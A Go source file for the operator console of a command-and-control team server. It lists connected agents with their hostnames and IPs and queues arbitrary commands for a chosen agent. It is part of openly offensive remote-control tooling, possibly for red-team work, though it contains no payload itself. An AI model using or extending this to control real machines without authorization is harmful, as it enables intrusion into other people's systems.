package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/had-nu/Go-ServerC2-Payload/internal/agentstore"
	"github.com/had-nu/Go-ServerC2-Payload/internal/c2proto"
	"github.com/had-nu/Go-ServerC2-Payload/internal/transport"
)

var errConsoleExit = errors.New("the operator left the console")

const prompt = "c2> "

type console struct {
	out       io.Writer
	store     *agentstore.Store
	events    <-chan transport.Event
	in        chan string
	stdinDone chan struct{}
	stopc     chan struct{}
	stopOnce  sync.Once
	activeID  string
}

func newConsole(out io.Writer, store *agentstore.Store, events <-chan transport.Event) *console {
	return &console{
		out:       out,
		store:     store,
		events:    events,
		in:        make(chan string),
		stdinDone: make(chan struct{}),
		stopc:     make(chan struct{}),
	}
}

// start prints the prompt and reads lines in the background. The events channel
// and the line channel meet in the same loop, so console output never
// interleaves with request output.
func (c *console) start() {
	c.writePrompt()
	go func() {
		defer close(c.stdinDone)
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			select {
			case c.in <- sc.Text():
			case <-c.stopc:
				return
			}
		}
	}()
}

// stop releases the console. It is safe to call more than once.
func (c *console) stop() {
	c.stopOnce.Do(func() { close(c.stopc) })
}

func (c *console) writePrompt() {
	if c.activeID == "" {
		fmt.Fprint(c.out, prompt)
		return
	}
	fmt.Fprintf(c.out, "\033[31m%s\033[0m c2> ", c2proto.ShortID(c.activeID))
}

func (c *console) run() error {
	c.start()
	for {
		select {
		case line := <-c.in:
			if err := c.handle(line); err != nil {
				return err
			}
			c.writePrompt()
		case ev := <-c.events:
			c.printEvent(ev)
			c.writePrompt()
		case <-c.stdinDone:
			// The standard input ended. A Team Server needs a terminal, so stop.
			fmt.Fprintln(c.out, "\nstandard input closed")
			return errConsoleExit
		case <-c.stopc:
			return nil
		}
	}
}

func (c *console) handle(line string) error {
	line = strings.TrimSpace(line)
	if line == "" {
		return nil
	}
	fields := strings.Fields(line)
	switch fields[0] {
	case "exit", "quit":
		fmt.Fprintln(c.out, "exiting the team server")
		return errConsoleExit
	case "help", "?":
		c.printHelp()
		return nil
	case "agents":
		c.printAgents()
		return nil
	case "interact":
		c.interact(fields)
		return nil
	case "back":
		c.activeID = ""
		return nil
	default:
		return c.queue(line)
	}
}

func (c *console) printHelp() {
	fmt.Fprint(c.out, `commands:
  agents                 list the registered agents
  interact <agent-id>    send the next line to one agent
  back                   stop sending to the agent
  exit                   stop the team server
  <any other line>       queue a command for the active agent
`)
}

func (c *console) printAgents() {
	snap := c.store.Snapshot(agentstore.DefaultTTL)
	if len(snap) == 0 {
		fmt.Fprintln(c.out, "no agents")
		return
	}
	fmt.Fprintln(c.out, "--- agents ---")
	for _, a := range snap {
		status := "DEAD"
		if a.Alive {
			status = "ALIVE"
		}
		fmt.Fprintf(c.out, "[%s] id=%s host=%s ip=%s last_seen=%s pending=%d\n",
			status, a.ShortID, a.Hostname, a.IP, a.Age, a.Pending)
	}
}

func (c *console) interact(fields []string) {
	if len(fields) < 2 {
		fmt.Fprintln(c.out, "usage: interact <agent-id>")
		return
	}
	id := fields[1]
	full := c.resolve(id)
	if full == "" {
		fmt.Fprintf(c.out, "no agent matches %q\n", id)
		return
	}
	c.activeID = full
	fmt.Fprintf(c.out, "sending to %s\n", c2proto.ShortID(full))
}

// resolve accepts a full ID or a short prefix.
func (c *console) resolve(prefix string) string {
	for _, a := range c.store.Snapshot(agentstore.DefaultTTL) {
		if a.ID == prefix || strings.HasPrefix(a.ID, prefix) {
			return a.ID
		}
	}
	return ""
}

func (c *console) queue(command string) error {
	if c.activeID == "" {
		fmt.Fprintln(c.out, "no active agent. Use 'agents' then 'interact <id>'.")
		return nil
	}
	if err := c2proto.ValidateCommand(command); err != nil {
		fmt.Fprintf(c.out, "the command was not queued: %v\n", err)
		return nil
	}
	task := c2proto.Task{TaskID: newTaskID(), Command: command}
	if err := c.store.Enqueue(c.activeID, task); err != nil {
		fmt.Fprintf(c.out, "the command was not queued: %v\n", err)
		return nil
	}
	fmt.Fprintf(c.out, "task %s queued for %s\n", task.TaskID, c2proto.ShortID(c.activeID))
	return nil
}

func (c *console) printEvent(ev transport.Event) {
	if ev.Text != "" {
		fmt.Fprintf(c.out, "\n%s\n", ev.Text)
		return
	}
	fmt.Fprintf(c.out, "\n[*] event for %s\n", c2proto.ShortID(ev.Agent))
}

// newTaskID returns a decimal timestamp with nanosecond resolution. The width
// matches c2proto.TaskIDLen so that the Team Server can validate it.
func newTaskID() string {
	return fmt.Sprintf("%019d", time.Now().UnixNano())
}
